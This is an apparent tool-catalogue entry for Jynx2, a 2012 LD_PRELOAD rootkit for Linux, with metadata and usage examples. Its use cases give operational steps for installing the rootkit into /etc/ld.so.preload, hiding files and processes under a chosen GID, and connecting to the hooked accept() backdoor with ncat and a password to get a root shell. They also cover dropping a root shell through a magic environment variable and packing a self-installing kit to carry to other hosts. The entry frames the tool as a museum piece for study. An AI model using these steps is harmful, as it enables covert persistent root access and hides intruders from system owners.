---
name: "jynx2"
categories:
  - blackarch-backdoor
version: "1.2bcbebf"
homepage: "https://github.com/chokepoint/Jynx2"
packaged-by: [blackarch]
blackarch-builddate: "2025-12-18"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "chokepoint/Jynx2"
github-stars: 185
github-pushed: "2012-12-15"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# jynx2

> 2012-era LD_PRELOAD userland rootkit for Linux that hides files, GIDs and processes by name, and turns any root daemon into a password-protected backdoor by hooking `accept()`.

## What it's for

Jynx2 (chokepoint / BlackHatAcademy, 2012) is a historical expansion of the original Jynx kit: instead of planting binaries, it compiles a `jynx2.so` shared library and registers it in `/etc/ld.so.preload`, so every dynamically linked process on the box loads the kit. From inside those processes it lies to the OS: anything whose name starts with a configured MAGIC_STRING, or owned by the configured MAGIC_GID, disappears from `ls`, `ps` and friends — files, directories and processes alike. Its backdoor half hooks the `accept()` system call inside long-running root daemons: a connection whose source port falls in a configured range (LOW_PORT–HIGH_PORT, root-only ports, factor one) and whose first line is the configured SHELL_PASSWORD (factor two) gets a root shell over that very service, with SSL support. It also drops a suid root shell on demand when a magic environment variable is set on an euid-0 program. Document it as a museum piece for studying LD_PRELOAD rootkits: modern hardened ld loaders, SELinux and EDR-era tooling make the 2012 techniques largely obsolete, but the hiding logic is the canonical reference for preload rootkits.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Compile and install the kit into the preload chain

From the configured source tree, build the library and let the Makefile install, inject and set the hiding GID.

```
make all
sudo make install
```

Outcome: `jynx2.so` is compiled and copied to the install directory, `/etc/ld.so.preload` is set to load it into every dynamic process, and the kit's files get MAGIC_GID so they self-hide; restart any daemon you want backdoored so it re-execs with the preload active.

### Install to a custom hidden directory and GID

Choose your own install path and hiding group at install time.

```
sudo make install INSTALL=/xdir MAGIC_GID=100
```

Outcome: the kit lands in `/xdir` and processes/files you chgrp to GID 100 vanish from directory listings and process tables on hosts running the preload.

### Connect to the accept() backdoor on a live service

Authenticate with both factors against a backdoored daemon (say, its port 80).

```
sudo ncat target.example.com 80 -p 42 --ssl
```

Then send the configured password as the first line:

```
S3cretPw
```

Outcome: the source port 42 falls inside LOW_PORT–HIGH_PORT and the password matches SHELL_PASSWORD, so the hooked `accept()` spawns a root shell inside the daemon's process; the `--ssl` flag matters because the backdoor speaks SSL. A normal connection without both factors just reaches the real service.

### Drop a local suid root shell via the magic environment variable

From any shell on the compromised host, set the kit's ENV_VARIABLE and run an euid-0 program.

```
XxJynx=hahahax sudo
whoami
```

Outcome: the preloaded library notices the magic variable inside the euid-0 execution and makes it drop a shell running as root — `whoami` prints `root` with no password prompt.

### Generate a self-installing kit for re-deployment

Bundle the configured kit into one script to carry to other hosts.

```
./packer.sh
```

Outcome: `autokit.sh` is generated containing the compiled kit and install steps; run it only on the target system you want to inject — it performs the copy, preload injection and GID setup in one shot.
